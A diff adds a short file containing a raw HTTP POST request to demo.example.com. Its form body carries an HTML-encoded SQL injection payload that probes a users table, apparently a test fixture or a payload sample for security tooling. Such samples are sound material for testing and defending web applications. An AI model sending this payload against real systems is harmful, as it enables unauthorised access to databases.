@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 67
+Connection: close
+
+id=1&#x27; and row(1,1)&#x3E;(select count(*),count(*) from users)#
